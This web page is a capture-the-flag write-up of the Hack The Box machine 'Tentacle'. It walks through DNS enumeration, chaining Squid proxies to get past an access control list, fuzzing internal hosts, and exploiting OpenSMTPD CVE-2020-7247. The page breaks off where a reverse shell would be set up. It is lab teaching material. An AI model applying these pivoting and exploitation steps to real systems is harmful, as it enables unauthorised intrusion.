<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Tentacle" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/tentacle/" /><meta property="og:url" content="https://x00tex.github.io/posts/tentacle/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/tentacle/tentacle_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-06-14T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/tentacle/tentacle_banner.png" /><meta property="twitter:title" content="Hackthebox - Tentacle" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-06-14T18:30:00+00:00","datePublished":"2021-06-14T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Tentacle","image":"https://x00tex.github.io/assets/img/posts/tentacle/tentacle_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/tentacle/"},"url":"https://x00tex.github.io/posts/tentacle/"}</script><title>Hackthebox - Tentacle | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Tentacle</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Tentacle</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1623695400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-06-14 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2077 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/tentacle/tentacle_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="enumeration">Enumeration</h1><p><strong>IP-ADDR:</strong> 10.10.10.224 realcorp.htb</p><p><strong>nmap scan:</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c <span class="o">(</span>RSA<span class="o">)</span>
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp   open  domain       ISC BIND 9.11.20 <span class="o">(</span>RedHat Enterprise Linux 8<span class="o">)</span>
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-06-11 01:59:57Z<span class="o">)</span>
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: Host: REALCORP.HTB<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:redhat:enterprise_linux:8
</pre></table></code></div></div><ul><li>Found hostname: <code class="language-plaintext highlighter-rouge">REALCORP.HTB</code></ul><h1 id="foothold">Foothold</h1><h2 id="dns-enumeration"><span class="mr-2">DNS Enumeration</span><a href="#dns-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="dig"><span class="mr-2">dig</span><a href="#dig" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Using <code class="language-plaintext highlighter-rouge">dig</code> command to retrieve “Any information” from dns server.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>❯ dig ANY @10.10.10.224 realcorp.htb

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> ANY @10.10.10.224 realcorp.htb
<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 50689
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: afc582c6ef7a34cce441fefa60c2e1e152f74c0432c1996b (good)
;; QUESTION SECTION:
;realcorp.htb.			IN	ANY

;; ANSWER SECTION:
realcorp.htb.		259200	IN	SOA	realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400
realcorp.htb.		259200	IN	NS	ns.realcorp.htb.

;; ADDITIONAL SECTION:
ns.realcorp.htb.	259200	IN	A	10.197.243.77

;; Query time: 620 msec
;; SERVER: 10.10.10.224#53(10.10.10.224)
;; WHEN: Fri Jun 11 15:05:24 IST 2021
;; MSG SIZE  rcvd: 143
</span></pre></table></code></div></div><ul><li>Found internal host IP <code class="language-plaintext highlighter-rouge">10.197.243.77</code> which is running nameservers.</ul><h3 id="dnsenum"><span class="mr-2">dnsenum</span><a href="#dnsenum" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Bruteforce hosts from dns server.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>❯ dnsenum <span class="nt">--threads</span> 64 <span class="nt">--dnsserver</span> 10.10.10.224 <span class="nt">-f</span> /usr/share/seclists/Discovery/DNS/namelist.txt realcorp.htb
<span class="nt">-----</span>   realcorp.htb   <span class="nt">-----</span>

... <span class="o">[</span>snip] ...

Name Servers:
______________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77

... <span class="o">[</span>snip] ...

Brute forcing with /usr/share/seclists/Discovery/DNS/namelist.txt:
___________________________________________________________________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31

... <span class="o">[</span>snip] ...
<span class="k">done</span><span class="nb">.</span>
</pre></table></code></div></div><ul><li>Host on <code class="language-plaintext highlighter-rouge">10.197.243.77</code> also running proxy server.<li>and there is another host running wpad(?)<ul><li><strong><a href="https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol">wpad</a></strong>(Web Proxy Auto-Discovery Protocol) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods.</ul></ul><p>There is another way to reverse dns bruteforce with <code class="language-plaintext highlighter-rouge">dnsrecon</code>, on entire subnet.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>❯ dnsrecon <span class="nt">-r</span> 10.197.243.0/24 <span class="nt">-n</span> 10.10.10.224 <span class="nt">-d</span> realcorp.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reverse Look-up of a Range
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Performing Reverse Lookup from 10.197.243.0 to 10.197.243.255
<span class="o">[</span>+] PTR wpad.realcorp.htb 10.197.243.31
<span class="o">[</span>+] PTR ns.realcorp.htb 10.197.243.77
<span class="o">[</span>+] 2 Records Found
</pre></table></code></div></div><h2 id="squid-proxy"><span class="mr-2">squid proxy</span><a href="#squid-proxy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There is a http-porxy running. which also leaking some information.</p><p><img data-src="/assets/img/posts/tentacle/subdomain-leak.png" alt="" data-proofer-ignore></p><ul><li>Subdomain: <code class="language-plaintext highlighter-rouge">srv01.realcorp.htb</code><li>Email: <code class="language-plaintext highlighter-rouge">j.nakazawa@realcorp.htb</code><li>Username: <code class="language-plaintext highlighter-rouge">j.nakazawa</code></ul><p>Because <a href="https://en.wikipedia.org/wiki/DNS_zone_transfer">zone transfer</a> in not available</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>❯ dig axfr realcorp.htb @10.10.10.224

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr realcorp.htb @10.10.10.224
<span class="p">;;</span> global options: +cmd
<span class="p">;</span> Transfer failed.
</pre></table></code></div></div><p>we can use this proxy to access internal proxy.</p><p>Setup <code class="language-plaintext highlighter-rouge">proxychains</code> to send traffic through the squid proxy and <code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>... <span class="o">[</span>snip] ...
<span class="o">[</span>ProxyList]
<span class="c"># add proxy here ...</span>
<span class="c">#tentacle</span>
http	10.10.10.224	3128    <span class="c">#Go through the squid proxy</span>
http	127.0.0.1   3128        <span class="c">#go through localhost to bypass ACL</span>
http    10.197.243.77   3128    <span class="c">#connect to internal proxy</span>
</pre></table></code></div></div><ul><li>Access control list (ACL) files are text files containing lists that define who can access Proxy Server resources. By default, the Proxy Server uses one ACL file that contains all of the lists for access to your server.<li>In this case proxy server restrict external IP to access internal host but localhost allowed.</ul><p>and now we can access to internal host <code class="language-plaintext highlighter-rouge">10.197.243.31</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>❯ proxychains curl <span class="nt">-I</span> http://10.197.243.31/
<span class="o">[</span>proxychains] config file found: /etc/proxychains.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
<span class="o">[</span>proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:80  ...  OK
HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Fri, 11 Jun 2021 04:55:25 GMT
Content-Type: text/html
Content-Length: 4057
Last-Modified: Mon, 07 Oct 2019 21:16:24 GMT
Connection: keep-alive
ETag: <span class="s2">"5d9bab28-fd9"</span>
Accept-Ranges: bytes
</pre></table></code></div></div><p>port 80 on internal host is running nginx. <em>Run <code class="language-plaintext highlighter-rouge">proxychains firefox</code> command to run firefox browser with proxychains</em></p><p><img data-src="/assets/img/posts/tentacle/internal-http.png" alt="" data-proofer-ignore></p><p>host <code class="language-plaintext highlighter-rouge">wpad.realcorp.htb</code> giving 403 on port 80.</p><p><img data-src="/assets/img/posts/tentacle/internal-subdomain.png" alt="" data-proofer-ignore></p><h2 id="ffuf-with-multi-proxy"><span class="mr-2">ffuf with multi-proxy</span><a href="#ffuf-with-multi-proxy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>while ffuf or gobuster don’t support multi-proxy fuzzing i found a hacky solution from <a href="https://github.com/ffuf/ffuf/issues/50">github-issue</a></p><ol><li>Configure the proxies I want to use in <a href="https://github.com/rofl0r/proxychains-ng">proxychains</a></ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>... <span class="o">[</span>snip] ...
http	10.10.10.224	3128
http	127.0.0.1   3128
http    10.197.243.77   3128
</pre></table></code></div></div><ol><li>Use proxychains to start a local instance of <a href="https://pypi.org/project/proxy.py/">proxy.py</a></ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ proxychains proxy
<span class="o">[</span>proxychains] config file found: /etc/proxychains.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
2021-06-11 18:15:19,817 - pid:13772 <span class="o">[</span>I] load_plugins:334 - Loaded plugin proxy.http.proxy.HttpProxyPlugin
2021-06-11 18:15:19,818 - pid:13772 <span class="o">[</span>I] listen:113 - Listening on ::1:8899
2021-06-11 18:15:19,840 - pid:13772 <span class="o">[</span>I] start_workers:136 - Started 8 workers
</pre></table></code></div></div><ol><li>Use ffuf single proxy feature (-x) to point it to my local proxy.py instance</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>❯ ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt:FUZZ <span class="nt">-u</span> http://wpad.realcorp.htb/FUZZ <span class="nt">-x</span> <span class="s1">'http://::1:8899'</span> <span class="nt">-v</span>

<span class="c">#... [snip] ...</span>

<span class="o">[</span>Status: 301, Size: 185, Words: 6, Lines: 8]
| URL | http://wpad.realcorp.htb/.
| <span class="nt">--</span><span class="o">&gt;</span> | http://wpad.realcorp.htb/./
    <span class="k">*</span> FUZZ: <span class="nb">.</span>

<span class="o">[</span>Status: 200, Size: 342, Words: 60, Lines: 11]
| URL | http://wpad.realcorp.htb/wpad.dat
    <span class="k">*</span> FUZZ: wpad.dat

:: Progress: <span class="o">[</span>11424/11424] :: Job <span class="o">[</span>1/1] :: 67 req/sec :: Duration: <span class="o">[</span>0:02:54] :: Errors: 52 ::
</pre></table></code></div></div><p>and found <code class="language-plaintext highlighter-rouge">wpad.dat</code> from <code class="language-plaintext highlighter-rouge">wpad.realcorp.htb</code>.</p><p><a href="https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol">wpad</a>(Web Proxy Auto-Discovery Protocol) is a server provides client proxy settings via a particular URL (e.g., <code class="language-plaintext highlighter-rouge">http://wpad.example.org/wpad.dat</code>)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>❯ proxychains <span class="nt">-q</span> curl <span class="nt">-s</span> http://wpad.realcorp.htb/wpad.dat
<span class="k">function </span>FindProxyForURL<span class="o">(</span>url, host<span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span>dnsDomainIs<span class="o">(</span>host, <span class="s2">"realcorp.htb"</span><span class="o">))</span>
        <span class="k">return</span> <span class="s2">"DIRECT"</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>isInNet<span class="o">(</span>dnsResolve<span class="o">(</span>host<span class="o">)</span>, <span class="s2">"10.197.243.0"</span>, <span class="s2">"255.255.255.0"</span><span class="o">))</span>
        <span class="k">return</span> <span class="s2">"DIRECT"</span><span class="p">;</span> 
    <span class="k">if</span> <span class="o">(</span>isInNet<span class="o">(</span>dnsResolve<span class="o">(</span>host<span class="o">)</span>, <span class="s2">"10.241.251.0"</span>, <span class="s2">"255.255.255.0"</span><span class="o">))</span>
        <span class="k">return</span> <span class="s2">"DIRECT"</span><span class="p">;</span> 
 
    <span class="k">return</span> <span class="s2">"PROXY proxy.realcorp.htb:3128"</span><span class="p">;</span>
<span class="o">}</span>
</pre></table></code></div></div><p>and get another internal subnet <code class="language-plaintext highlighter-rouge">10.241.251.0/24</code></p><p>Running <code class="language-plaintext highlighter-rouge">dnsrecon</code> for reverse dns bruteforce.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>❯ proxychains <span class="nt">-q</span> dnsrecon <span class="nt">-r</span> 10.241.251.0/24 <span class="nt">-n</span> 10.10.10.224 <span class="nt">-d</span> realcorp.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reverse Look-up of a Range
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Performing Reverse Lookup from 10.241.251.0 to 10.241.251.255
<span class="o">[</span>+] PTR srvpod01.realcorp.htb 10.241.251.113
<span class="o">[</span>+] 1 Records Found
</pre></table></code></div></div><ul><li>Found another host on <code class="language-plaintext highlighter-rouge">10.241.251.113</code>.</ul><p>Running nmap scan found port 25 smtp</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>❯ proxychains <span class="nt">-q</span> nmap <span class="nt">--top</span><span class="o">=</span>10 <span class="nt">--open</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.241.251.113
Starting Nmap 7.91SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-11 17:21 IST
Nmap scan report <span class="k">for </span>10.241.251.113
Host is up <span class="o">(</span>2.1s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 9 closed ports
PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org <span class="o">[</span>10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs <span class="k">in </span>the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
Service Info: Host: smtp.realcorp.htb
</pre></table></code></div></div><h2 id="opensmtpd-rce"><span class="mr-2">OpenSMTPD RCE</span><a href="#opensmtpd-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Found Remote Code Execution from searchsploit</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>❯ searchsploit OpenSMTPD
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                              |  Path
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
... <span class="o">[</span>snip] ...
OpenSMTPD 6.6.1 - Remote Code Execution                     | linux/remote/47984.py
... <span class="o">[</span>snip] ...
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</pre></table></code></div></div><p><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247">CVE-2020-7247</a>:</strong> smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the “uncommented” default configuration. The issue exists because of an incorrect return value upon failure of input validation. <strong><a href="https://www.exploit-db.com/exploits/47984">Exploit</a></strong></p><p>only change requires in exploit script is <code class="language-plaintext highlighter-rouge">RCPT &lt;email&gt;</code>(a valid user email) which we found from squid leak <code class="language-plaintext highlighter-rouge">j.nakazawa@realcorp.htb</code></p><p><img data-src="/assets/img/posts/tentacle/opensmtp-rce.png" alt="" data-proofer-ignore></p><p>Getting reverse shell with python web server and wget.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
